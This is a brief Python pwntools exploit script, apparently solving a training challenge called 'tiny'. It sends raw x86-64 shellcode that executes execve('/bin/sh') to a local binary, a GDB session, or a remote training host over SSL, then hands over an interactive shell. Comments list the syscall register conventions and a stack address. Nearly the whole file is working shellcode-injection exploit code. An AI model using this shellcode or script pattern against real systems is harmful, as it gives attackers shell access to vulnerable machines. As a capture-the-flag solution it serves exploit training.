from pwn import *

COMMANDS = """
b*0x40116e
continue
"""
shellcode = b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x0f\x05"

#ncat --ssl back-to-shell.training.offensivedefensive.it 8080
if args.GDB:
    p = gdb.debug("./tiny", gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./tiny")
p.send(shellcode)
p.interactive()

#0x40116e

#execve("/bin/sh\0", NULL, NULL)

#(rdi, rsi, rdx), r10, r8, r9
#const char *filename, const char *const *argv, const char *const *envp

0x7ffeeec9e500